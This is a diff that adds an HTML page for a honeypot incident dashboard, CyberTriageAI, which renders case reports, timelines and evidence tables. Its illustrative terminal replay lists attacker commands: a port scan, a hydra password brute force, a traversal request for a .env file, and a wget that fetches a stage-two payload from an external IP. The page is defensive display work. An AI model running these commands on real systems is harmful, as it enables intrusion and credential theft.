@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Case report — CyberTriageAI</title>
+<meta name="description" content="AI-generated honeypot incident cases: what happened, why it matters, what to do next — every sentence traceable to the events behind it.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wght@500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/site.css">
+<style>
+  .caseitem { width: 100%; text-align: left; cursor: pointer; font-family: "IBM Plex Sans", sans-serif; padding: 14px 16px; border-radius: 14px; border: 1px solid transparent; background: transparent; color: #fff; transition: background .3s, border-color .3s; }
+  .caseitem:hover { background: rgba(242,84,125,.08); }
+  .caseitem[aria-current="true"] { background: rgba(242,84,125,.12); border-color: rgba(242,84,125,.45); }
+  .report h3 { font-family: Archivo, sans-serif; font-size: 13px; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: #F2547D; margin: 0 0 10px; }
+  .report p { margin: 0; font-size: 16px; line-height: 28px; color: rgba(255,255,255,.82); max-width: 68ch; text-wrap: pretty; }
+  .report section { animation: rise .5s cubic-bezier(.22,1,.36,1) both; }
+  @keyframes drawLine { from { transform: scaleY(0); } to { transform: scaleY(1); } }
+  @keyframes dotPulse { 0% { box-shadow: 0 0 0 0 currentColor; opacity: 1; } 70% { box-shadow: 0 0 0 9px transparent; } 100% { box-shadow: 0 0 0 0 transparent; } }
+  @keyframes rainbow { from { filter: hue-rotate(0deg); } to { filter: hue-rotate(360deg); } }
+  @keyframes blink { 50% { opacity: 0; } }
+  .term { position: absolute; inset: 0; padding: 34px 18px 14px; font-size: 13px; line-height: 26px; color: #5FE3B0; animation: rainbow 24s linear infinite; overflow: hidden; }
+  .term div { opacity: 0; transform: translateY(4px); transition: opacity .35s ease, transform .35s ease; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .term div[data-on] { opacity: 1; transform: none; }
+  .term .err { color: #C4173F; font-weight: 700; }
+  .term .cur { display: inline-block; width: 6px; height: 11px; background: currentColor; vertical-align: -1px; animation: blink 1s steps(1) infinite; }
+  .tl-line { transform-origin: top; animation: drawLine .6s cubic-bezier(.22,1,.36,1) both; }
+  .tl-dot { animation: dotPulse 2.4s ease-out infinite; }
+  .evbar { height: 3px; border-radius: 2px; margin-top: 7px; width: 0; transition: width .9s cubic-bezier(.22,1,.36,1); }
+  .split { display: flex; height: 8px; border-radius: 5px; overflow: hidden; background: rgba(255,255,255,.07); }
+  .split i { display: block; width: 0; transition: width .9s cubic-bezier(.22,1,.36,1); }
+  .facts { display: grid; grid-template-columns: repeat(5, minmax(0,1fr)); gap: 18px; }
+  .fact-v { margin-top: 7px; font-family: Archivo, sans-serif; font-size: 22px; font-weight: 600; color: #fff; }
+  .ev { display: grid; grid-template-columns: 88px 1fr auto; gap: 14px; align-items: center; padding: 12px 4px; border-bottom: 1px solid rgba(255,255,255,.06); }
+  .unfold { display: grid; grid-template-columns: minmax(0,1fr) 440px; gap: 34px; align-items: start; }
+  .replay { position: relative; height: 500px; border-radius: 14px; overflow: hidden; border: 1px solid rgba(242,84,125,.28); background: #100C24 url(assets/glitch.png) center/cover no-repeat; }
+  #shell { display: grid; grid-template-columns: 300px minmax(0,1fr); gap: 16px; padding: 20px; align-items: start; }
+  @media (max-width: 1100px) { #shell { grid-template-columns: minmax(0,1fr); } }
+  @media (max-width: 1000px) { .unfold { grid-template-columns: minmax(0,1fr); } .replay { height: 320px; } }
+  @media (max-width: 760px) { .facts { grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); } .facts .eyebrow { white-space: normal; } .ev { grid-template-columns: 1fr auto; } .ev > .chip { grid-column: 1 / -1; justify-self: start; } }
+</style>
+</head>
+<body>
+
+<header id="site-header"></header>
+
+<div id="shell">
+  <aside class="panel" style="padding:8px;">
+    <div style="padding:12px 12px 10px;display:flex;align-items:center;justify-content:space-between;">
+      <span class="eyebrow">Investigations</span>
+      <span style="font-size:12px;color:rgba(255,255,255,.4);">last 7 days</span>
+    </div>
+    <div id="list" style="display:flex;flex-direction:column;gap:2px;" role="list"></div>
+  </aside>
+
+  <main id="report" class="report" style="display:flex;flex-direction:column;gap:16px;" aria-live="polite"></main>
+</div>
+
+<footer id="site-footer"></footer>
+
+<script src="assets/data.js"></script>
+<script src="assets/figures.js"></script>
+<script src="assets/site.js"></script>
+<script>
+(function () {
+  var S = window.Site, el = S.el, fmt = S.fmt, SEV = S.SEV, D = window.DATA, RM = S.RM;
+  var CASES = S.STATS.cases;   // findings / ips / techniques already computed from the evidence tables
+  S.embed("casesHeight", document.getElementById("shell"));
+  S.renderHeader("cases.html", S.livePill(S.STATS.openCases + " open investigations"));
+  S.renderFooter();
+
+  var sel = 0;
+  var hash = (location.hash || "").replace("#", "");
+  CASES.forEach(function (c, i) { if (c.id === hash) sel = i; });
+
+  function chip(text, color) { return el("span", { className: "chip", style: "border:1px solid " + color + "55;color:" + color + ";" }, text); }
+
+  function renderList() {
+    S.replace(S.$("list"), CASES.map(function (c, i) {
+      return el("button", { className: "caseitem", type: "button", role: "listitem", "aria-current": i === sel ? "true" : "false",
+        onclick: function () { sel = i; history.replaceState(null, "", "#" + c.id); renderList(); renderReport(); } },
+        el("div", { style: "display:flex;align-items:center;justify-content:space-between;gap:10px;" },
+          el("span", { style: "font-size:14px;font-weight:500;color:#fff;" }, c.date), chip(c.sev, SEV[c.sev])),
+        el("div", { style: "margin-top:6px;font-size:12px;color:rgba(255,255,255,.45);" }, fmt(c.findings) + " findings · " + c.status));
+    }));
+  }
+
+  function fact(label, value) {
+    return el("div", null, el("div", { className: "eyebrow" }, label), el("div", { className: "fact-v" }, String(value)));
+  }
+  function techBadge(id) { return el("span", { style: "border:1px solid rgba(242,84,125,.35);border-radius:5px;padding:1px 6px;" }, S.mitreLink(id, "font-size:11px;")); }
+
+  function renderReport() {
+    var c = CASES[sel];
+    var evMax = Math.max.apply(null, c.events.map(function (e) { return e.n; }));
+
+    // technique share, computed from the evidence table
+    var byTech = {};
+    c.events.forEach(function (e) { byTech[e.id] = byTech[e.id] || { n: 0, sev: e.sev, name: e.tech }; byTech[e.id].n += e.n; });
+    var entries = Object.keys(byTech).map(function (k) { return [k, byTech[k]]; }).sort(function (a, b) { return b[1].n - a[1].n; });
+    var tot = entries.reduce(function (s, e) { return s + e[1].n; }, 0);
+
+    var split = el("div", { className: "split", role: "img", "aria-label": "Share of events by technique" }, entries.map(function (e, i) {
+      return el("i", { "data-w": (e[1].n / tot * 100).toFixed(1), style: "background:" + SEV[e[1].sev] + ";transition-delay:" + (i * 120) + "ms;" });
+    }));
+    var splitKey = el("div", { style: "margin-top:12px;display:flex;flex-wrap:wrap;gap:12px;" }, entries.map(function (e) {
+      return el("span", { style: "display:flex;align-items:center;gap:7px;font-size:12px;color:rgba(255,255,255,.6);white-space:nowrap;" },
+        el("i", { style: "width:8px;height:8px;border-radius:2px;background:" + SEV[e[1].sev] + ";display:block;" }),
+        S.mitreLink(e[0], "color:" + SEV[e[1].sev] + ";"), " " + Math.round(e[1].n / tot * 100) + "%");
+    }));
+
+    var term = el("div", { id: "term", className: "term mono", "aria-hidden": "true" });
+
+    S.replace(S.$("report"),
+      el("section", { className: "panel", style: "padding:24px 26px;" },
+        el("div", { style: "display:flex;align-items:flex-start;justify-content:space-between;gap:20px;flex-wrap:wrap;" },
+          el("div", null,
+            el("div", { style: "display:flex;align-items:center;gap:10px;flex-wrap:wrap;" },
+              el("span", { className: "mono", style: "font-size:12px;color:rgba(255,255,255,.45);" }, c.id), chip(c.sev, SEV[c.sev]),
+              el("span", { className: "chip", style: "border:1px solid rgba(255,255,255,.2);color:rgba(255,255,255,.6);" }, c.status)),
+            el("h1", { style: "font-family:Archivo,sans-serif;font-size:30px;font-weight:600;letter-spacing:-.7px;margin:12px 0 0;" }, "Honeypot incident · " + c.date),
+            el("p", { style: "margin:8px 0 0;font-size:14px;color:rgba(255,255,255,.5);" }, c.window + " · " + D.node),
+            el("p", { className: "disclaimer", style: "margin-top:12px;" }, S.DISCLAIMER))),
+        el("div", { className: "facts", style: "margin-top:26px;padding-top:22px;border-top:1px solid rgba(255,255,255,.08);" },
+          fact("Duration", c.dur), fact("Raw events", fmt(c.findings)), fact("Attacker IPs", c.ips), fact("Techniques", c.techniques), fact("Confidence", c.confidence)),
+        el("div", { style: "margin-top:24px;padding-top:22px;border-top:1px solid rgba(255,255,255,.08);" },
+          el("div", { className: "eyebrow" }, "What they were trying"),
+          el("div", { style: "margin-top:14px;" }, split), splitKey,
+          el("p", { style: "margin:18px 0 0;font-size:13px;line-height:21px;color:rgba(255,255,255,.45);max-width:46ch;" }, "Share of this case's events by ATT&CK technique. The honeypot answered every request — and gave nothing away."))),
+
+      el("section", { className: "panel", style: "padding:28px 30px;animation-delay:60ms;" },
+        el("div", { className: "unfold" },
+          el("div", { style: "display:flex;flex-direction:column;gap:26px;" },
+            el("div", null, el("h3", null, "What happened"), el("p", null, c.happened)),
+            el("div", { style: "height:1px;background:rgba(255,255,255,.07);" }),
+            el("div", null, el("h3", null, "Why it matters"), el("p", null, c.matters)),
+            el("div", { style: "height:1px;background:rgba(255,255,255,.07);" }),
+            el("div", null, el("h3", null, "What to do next"), el("p", null, c.next))),
+          el("div", { className: "replay" },
+            el("div", { style: "position:absolute;inset:0;background:linear-gradient(180deg,rgba(20,16,46,.72),rgba(20,16,46,.86));" }),
+            term,
+            el("div", { style: "position:absolute;inset:0;pointer-events:none;background:repeating-linear-gradient(180deg,rgba(255,255,255,.045) 0 1px,transparent 1px 3px);" }),
+            el("span", { style: "position:absolute;top:10px;right:12px;font-size:10px;letter-spacing:1.6px;text-transform:uppercase;color:rgba(255,255,255,.4);" }, "attacker session · illustrative replay")))),
+
+      el("section", { className: "panel", style: "padding:24px 26px;animation-delay:120ms;" },
+        el("div", { className: "eyebrow" }, "How it unfolded"),
+        el("div", { style: "margin-top:20px;display:flex;flex-direction:column;" }, c.phases.map(function (p, i) {
+          var last = i === c.phases.length - 1;
+          return el("div", { style: "display:grid;grid-template-columns:82px 18px minmax(0,1fr);gap:14px;" },
+            el("span", { className: "mono", style: "font-size:12px;color:rgba(255,255,255,.5);padding-top:1px;" }, p.t),
+            el("div", { style: "display:flex;flex-direction:column;align-items:center;" },
+              el("span", { className: "tl-dot", style: "width:11px;height:11px;border-radius:50%;background:" + SEV[p.sev] + ";color:" + SEV[p.sev] + "55;animation-delay:" + (i * 300) + "ms;" }),
+              last ? null : el("span", { className: "tl-line", style: "flex:1;width:1px;background:linear-gradient(180deg," + SEV[p.sev] + "66,rgba(255,255,255,.08));animation-delay:" + (i * 180 + 200) + "ms;" })),
+            el("div", { style: "padding-bottom:" + (last ? 0 : 22) + "px;" },
+              el("div", { style: "display:flex;align-items:center;gap:10px;flex-wrap:wrap;" }, el("span", { style: "font-size:15px;font-weight:500;" }, p.label), p.tech ? techBadge(p.tech) : null),
+              el("div", { style: "margin-top:5px;font-size:14px;line-height:22px;color:rgba(255,255,255,.55);" }, p.body)));
+        }))),
+
+      el("section", { className: "panel", style: "padding:24px 26px;animation-delay:180ms;" },
+        el("div", { style: "display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;" },
+          el("div", { className: "eyebrow" }, "Evidence · grouped events"),
+          el("span", { style: "font-size:12px;color:rgba(255,255,255,.4);" }, c.events.length + " groups · " + fmt(c.findings) + " raw events")),
+        el("div", { style: "margin-top:14px;" }, c.events.map(function (ev) {
+          return el("div", { className: "ev" },
+            el("span", { className: "chip", style: "border:1px solid " + SEV[ev.sev] + "55;color:" + SEV[ev.sev] + ";text-align:center;" }, ev.sev),
+            el("div", { style: "min-width:0;" },
+              el("span", { className: "mono", style: "font-size:13px;color:#fff;" }, ev.ip),
+              el("div", { style: "margin-top:4px;font-size:13px;color:rgba(255,255,255,.55);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;" }, S.mitreLink(ev.id), " · " + ev.tech)),
+            el("div", { style: "text-align:right;min-width:86px;" },
+              el("span", { className: "mono", style: "font-size:14px;color:rgba(255,255,255,.85);" }, fmt(ev.n) + "×"),
+              el("div", { className: "evbar", "data-w": Math.round(ev.n / evMax * 100), style: "background:" + SEV[ev.sev] + ";" })));
+        })),
+        el("p", { style: "margin:16px 0 0;font-size:12px;color:rgba(255,255,255,.4);" }, "Every sentence above is generated from these groups. Nothing in the report exists without an event behind it.")));
+
+    requestAnimationFrame(function () {
+      document.querySelectorAll(".split i, .evbar").forEach(function (b) { b.style.width = b.getAttribute("data-w") + "%"; });
+    });
+    runTerminal();
+  }
+
+  // Illustrative attacker session. T1.7: no real hostname — the target is described generically.
+  var TERM_LINES = [
+    "$ nmap -p- <internet-facing honeypot listener>",
+    "  22/tcp open   ssh",
+    "  445/tcp open  microsoft-ds",
+    "$ hydra -l admin -P rockyou.txt smb://<listener>",
+    "  [445] login: admin  pass: admin  FAILED",
+    "$ curl -s /cgi-bin/.%2e/.env",
+    "  200 OK  ·  0 bytes returned",
+    "$ wget http://45.9.148.12/stage2.bin",
+    "  connecting … 404 NOT FOUND",
+    "  ERROR 404: nothing here. session logged."
+  ];
+  function runTerminal() {
+    var host = S.$("term"); if (!host) return;
+    clearTimeout(window._termT);
+    var cycle = function () {
+      var rows = TERM_LINES.map(function (l, i) { return el("div", { className: i === TERM_LINES.length - 1 ? "err" : null }, l); });
+      S.replace(host, rows, el("div", { "data-on": "", style: "color:rgba(255,255,255,.45);margin-top:4px;" }, "$ ", el("span", { className: "cur" })));
+      rows.forEach(function (r, i) {
+        if (RM) { r.setAttribute("data-on", "1"); return; }
+        setTimeout(function () { r.setAttribute("data-on", "1"); }, 600 + i * 5000);
+      });
+      if (!RM) window._termT = setTimeout(cycle, 600 + TERM_LINES.length * 5000 + 3000);
+    };
+    cycle();
+  }
+
+  renderList();
+  renderReport();
+})();
+</script>
+</body>
+</html>
